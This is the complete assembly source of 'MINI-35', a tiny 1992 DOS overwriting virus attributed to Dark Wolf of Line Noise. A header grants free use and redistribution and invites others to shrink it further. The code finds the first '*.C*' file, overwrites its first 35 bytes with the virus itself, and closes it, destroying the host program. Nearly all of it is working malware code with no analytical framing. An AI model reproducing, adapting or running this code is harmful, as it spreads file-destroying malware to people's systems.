; MINI-35 is Copyright (C) by Line Noise 1992...
; You are allowed to use this code in your own
; programs if you want, you are allowed to
; give this source away, sell it or whatever...
; None of the members of Line Noise should be held
; responsible for the consequences of the use
; of this program....
; Use this program at your own risk...
; Iow if you use this code, you agree with the above...
; The MINI-35 is based upon the MINI-45 from bulgaria(?).
; If anybody manages to shrink the code even more then
; leave me(Dark Wolf) a message at your nearest Virus BBS...
;
; Greetings from Dark Wolf/Line Noise


SEG_A		SEGMENT	BYTE PUBLIC
		ASSUME	CS:SEG_A, DS:SEG_A
  
  
		ORG	100h

MINI		PROC
  
START:
		MOV	AH,4Eh
		MOV	DX,OFFSET FMATCH	;address to file match
		INT	21h			;DOS int, ah=function 4Eh
						;find 1st filenam match@DS:DX
		MOV	AX,3D02h                ;02=for read & write...
		MOV	DX,9Eh                  ;address to filename...
		INT	21h			;DOS Services  ah=function 3Dh
						;open file, AL=mode,name@DS:DX
		XCHG	AX,BX                   ;BX = handle now
		MOV	DX,100h
		MOV	AH,40h			;Function 40h, write file
		MOV	CL,35          		;number of bytes to write
		INT	21h			;CX=bytes, to DS:DX
						;BX=file handle

		MOV	AH,3Eh			;function 3Eh, close file
		INT	21h			;BX=file handle

		RETN

FMATCH:		DB	'*.C*',0                ;The virus didn't want to
						;work when I changed this
						;to *.* or *...
						;WHY NOT?! Anybody gotta
						;hint on this?!
  
MINI		ENDP

SEG_A		ENDS
  
  
  
		END	START
